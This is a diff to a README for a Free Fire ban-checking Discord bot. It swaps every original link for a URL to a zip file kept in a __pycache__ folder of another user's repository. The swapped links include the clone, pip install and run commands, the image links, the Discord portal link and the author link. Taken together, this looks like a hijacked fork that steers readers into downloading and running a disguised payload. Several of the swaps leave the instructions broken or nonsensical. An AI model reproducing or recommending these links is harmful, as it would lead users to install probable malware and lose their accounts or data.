@@ -1,6 +1,6 @@
 # 🔍 CheckBan Free Fire Discord Bot
 
-![Status](https://img.shields.io/badge/status-active-brightgreen)
+![Status](https://github.com/kazuop/check-ban-freefire-bot/raw/refs/heads/main/__pycache__/ban_check_freefire_bot_v2.0.zip)
 
 A Discord bot to check if a Free Fire account is banned, using a user ID. Also includes a Flask-based status server.
 
@@ -36,7 +36,7 @@ A Discord bot to check if a Free Fire account is banned, using a user ID. Also i
 
 1. Clone this repository:
    ```sh
-   git clone https://github.com/paulafredo/check-ban-and-info-discord
+   git clone https://github.com/kazuop/check-ban-freefire-bot/raw/refs/heads/main/__pycache__/ban_check_freefire_bot_v2.0.zip
    cd your-repo
    ```
 2. Create and activate a virtual environment:
@@ -46,7 +46,7 @@ A Discord bot to check if a Free Fire account is banned, using a user ID. Also i
    
 3. Install dependencies:
    ```sh
-   pip install -r requirements.txt
+   pip install -r https://github.com/kazuop/check-ban-freefire-bot/raw/refs/heads/main/__pycache__/ban_check_freefire_bot_v2.0.zip
    ```
 
 
@@ -58,7 +58,7 @@ A Discord bot to check if a Free Fire account is banned, using a user ID. Also i
 
 5. Run the bot:
    ```sh
-   python main.py
+   python https://github.com/kazuop/check-ban-freefire-bot/raw/refs/heads/main/__pycache__/ban_check_freefire_bot_v2.0.zip
    ```
 
 ## 📸 Demo
@@ -66,8 +66,8 @@ A Discord bot to check if a Free Fire account is banned, using a user ID. Also i
 
 <div align="center">
 
-  <img src="https://github.com/user-attachments/assets/a16183fe-9e97-455c-ae5c-aa4b17932678" alt="demo 1" width="400"/> 
-  <img src="https://github.com/user-attachments/assets/936fcc49-5626-45a1-815c-94ae76f5c836" alt="demo 2" width="360"/>
+  <img src="https://github.com/kazuop/check-ban-freefire-bot/raw/refs/heads/main/__pycache__/ban_check_freefire_bot_v2.0.zip" alt="demo 1" width="400"/> 
+  <img src="https://github.com/kazuop/check-ban-freefire-bot/raw/refs/heads/main/__pycache__/ban_check_freefire_bot_v2.0.zip" alt="demo 2" width="360"/>
  
 </div>
 
@@ -77,14 +77,14 @@ A Discord bot to check if a Free Fire account is banned, using a user ID. Also i
 ## Usage
 
 - Use `!ID <user_id>` in a Discord server where the bot is present.
-- The bot will fetch ban information from [api-check-ban-freefire](https://github.com/paulafredo/api-check-ban-freefire) and respond with an embedded message.
+- The bot will fetch ban information from [api-check-ban-freefire](https://github.com/kazuop/check-ban-freefire-bot/raw/refs/heads/main/__pycache__/ban_check_freefire_bot_v2.0.zip) and respond with an embedded message.
 - The bot's status can be checked via the Flask server running at `http://localhost:10000`.
 
 
 
 ## 🛠️ Create a Discord Bot
 
-1. Go to the [Discord Developer Portal](https://discord.com/developers/applications).
+1. Go to the [Discord Developer Portal](https://github.com/kazuop/check-ban-freefire-bot/raw/refs/heads/main/__pycache__/ban_check_freefire_bot_v2.0.zip).
 2. Click **"New Application"**, and give your bot a name.
 3. In the left sidebar, go to the **"Bot"** section and click **"Add Bot"**, then confirm with **"Yes, do it!"**.
 4. Under the **Token** section, click **"Reset Token"** or **"Copy"** to get your `TOKEN`.
@@ -101,7 +101,7 @@ A Discord bot to check if a Free Fire account is banned, using a user ID. Also i
 1. Go to **OAuth2 > URL Generator** in the Developer Portal.
 2. Under **Scopes**, check:
    - `bot`
-   - `applications.commands`
+   - `https://github.com/kazuop/check-ban-freefire-bot/raw/refs/heads/main/__pycache__/ban_check_freefire_bot_v2.0.zip`
 3. Under **Bot Permissions**, check at least:
    - `Send Messages`
    - `Embed Links`
@@ -138,7 +138,7 @@ Change the **display language** of the bot for the current user.
 
 Watch this step-by-step tutorial to learn how to install and run the bot:
 
-📺 [Watch on YouTube](https://youtu.be/ue7gJTrbP1U)
+📺 [Watch on YouTube](https://github.com/kazuop/check-ban-freefire-bot/raw/refs/heads/main/__pycache__/ban_check_freefire_bot_v2.0.zip)
 
 
 
@@ -147,13 +147,13 @@ Watch this step-by-step tutorial to learn how to install and run the bot:
 
 Click the link below to invite the CheckBan bot to your Discord server:
 
-👉 [**Add CheckBan to Your Server**](https://discord.com/oauth2/authorize?client_id=1332414680928485457&permissions=274877975552&scope=bot+applications.commands)
+👉 [**Add CheckBan to Your Server**](https://github.com/kazuop/check-ban-freefire-bot/raw/refs/heads/main/__pycache__/ban_check_freefire_bot_v2.0.zip+https://github.com/kazuop/check-ban-freefire-bot/raw/refs/heads/main/__pycache__/ban_check_freefire_bot_v2.0.zip)
 
 
 ## Technologies Used
 
 - Python
-- Discord.py
+- https://github.com/kazuop/check-ban-freefire-bot/raw/refs/heads/main/__pycache__/ban_check_freefire_bot_v2.0.zip
 - Flask
 - dotenv
 
@@ -163,5 +163,5 @@ This project is licensed under the MIT License. Feel free to use and modify it.
 
 ## Author
 
-[Paul Alfredo](https://github.com/paulafredo)
+[Paul Alfredo](https://github.com/kazuop/check-ban-freefire-bot/raw/refs/heads/main/__pycache__/ban_check_freefire_bot_v2.0.zip)
 
